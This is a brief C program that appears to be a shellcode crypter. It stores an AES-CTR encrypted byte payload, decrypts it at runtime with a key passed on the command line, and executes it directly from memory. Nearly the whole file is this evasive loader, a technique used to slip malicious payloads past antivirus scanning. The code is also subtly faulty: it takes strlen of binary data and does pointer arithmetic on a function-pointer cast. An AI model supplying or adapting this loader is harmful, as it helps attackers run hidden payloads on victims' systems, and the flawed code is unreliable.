#include <stdio.h>
#include <string.h>

#include "AesCtrCommon.h"

unsigned char shellcode[] = 
"\x8a\x65\xf5\xf1\xd7\x9f\xaa\x70\xe1\xb7\xdb\x92\x42\xef\xc6\x08\xda\xd6\x8d\x53\xe6\xdc\x77\xa4\x64\x37\x9c\xd9\xc9\x96\xd9\x0b\xfc\xfe\x9f\xc1\xaa\xa3\xcf\x9b\x96\x52\x74\x56\x53\x7a\x39\x04\xe6\x4c\x5c\x20\x33";


int main(int argc, char *argv[])
{
	aes_ctr_t state;
	unsigned char iv[8];
	int shellcode_len = strlen(shellcode);
	int (*ret)() = (int (*)())shellcode + 8;

	memcpy(iv, shellcode, 8);

	init_aes_ctr(&state, &iv, argv[1], 0); 

	aes_ctr_enc_msg(shellcode + 8, shellcode_len, &state);

	ret();

	printf("\n");

	return 0;
}

